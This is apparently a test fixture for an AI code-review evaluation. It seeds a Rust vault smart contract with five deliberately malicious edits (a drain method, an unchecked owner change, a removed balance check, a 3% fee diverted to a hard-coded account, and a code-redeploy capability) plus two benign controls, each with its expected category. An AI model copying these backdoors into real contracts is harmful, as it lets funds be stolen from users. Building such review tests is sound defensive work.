// Seeded diffs for the AI-review eval. Each case edits the honest demo-vault-v1 source (comments
// and tests stripped) in one way. Ground truth: 5 malicious edits with an expected category, and
// 2 benign controls that should not be flagged medium or high.
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { stripRust, type Finding } from "../src/review.ts";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
export const V1 = stripRust(fs.readFileSync(path.join(ROOT, "contracts/demo-vault-v1/src/lib.rs"), "utf8"));

function edit(src: string, find: string, replace: string): string {
  if (!src.includes(find)) throw new Error(`seed anchor not found: ${find.slice(0, 60)}`);
  return src.replace(find, replace);
}
const GET_OWNER = `    pub fn get_owner(&self) -> AccountId {
        self.owner_id.clone()
    }`;

export interface EvalCase {
  id: string;
  description: string;
  malicious: boolean;
  expect?: Finding["category"][];
  source: string;
}

export const CASES: EvalCase[] = [
  {
    id: "drain-method",
    description: "adds an owner-only method that sends the whole vault total to any account",
    malicious: true,
    expect: ["drain"],
    source: edit(V1, GET_OWNER, `${GET_OWNER}

    pub fn rebalance(&mut self, to: AccountId) {
        require!(env::predecessor_account_id() == self.owner_id, "owner");
        let amount = self.total;
        self.total = 0;
        env::promise_return(transfer(&to, amount));
    }`),
  },
  {
    id: "owner-change-unchecked",
    description: "adds set_owner with no authorization check",
    malicious: true,
    expect: ["authority"],
    source: edit(V1, GET_OWNER, `${GET_OWNER}

    pub fn set_owner(&mut self, owner_id: AccountId) {
        self.owner_id = owner_id;
    }`),
  },
  {
    id: "balance-check-removed",
    description: "withdraw no longer checks the caller's balance",
    malicious: true,
    expect: ["check-removed", "drain"],
    source: edit(edit(V1, `        require!(amount <= balance, "Insufficient balance");\n`, ""), "self.set_balance(&account, balance - amount);", "self.set_balance(&account, balance.saturating_sub(amount));"),
  },
  {
    id: "fee-recipient",
    description: "withdraw now diverts 3% to a hard-coded account",
    malicious: true,
    expect: ["fee", "drain"],
    source: edit(V1, "        let transfer = transfer(&account, amount);", `        let fee = amount * 3 / 100;
        transfer(&"collector-7731.near".parse().unwrap(), fee);
        let transfer = transfer(&account, amount - fee);`),
  },
  {
    id: "deploy-capability",
    description: "adds an owner method that deploys new code from its input",
    malicious: true,
    expect: ["code-change"],
    source: edit(V1, GET_OWNER, `${GET_OWNER}

    pub fn update(&mut self) {
        require!(env::predecessor_account_id() == self.owner_id, "owner");
        let code = env::input().expect("code");
        let p = env::promise_batch_create(&env::current_account_id());
        env::promise_batch_action_deploy_contract(p, &code);
    }`),
  },
  {
    id: "benign-view",
    description: "adds a read-only view returning the number of the vault version",
    malicious: false,
    source: edit(V1, GET_OWNER, `${GET_OWNER}

    pub fn version_number(&self) -> u32 {
        1
    }`),
  },
  {
    id: "benign-log-text",
    description: "changes the wording of the deposit log line",
    malicious: false,
    source: edit(V1, 'env::log_str(&format!("deposit {account} {amount}"));', 'env::log_str(&format!("deposited {amount} for {account}"));'),
  },
];
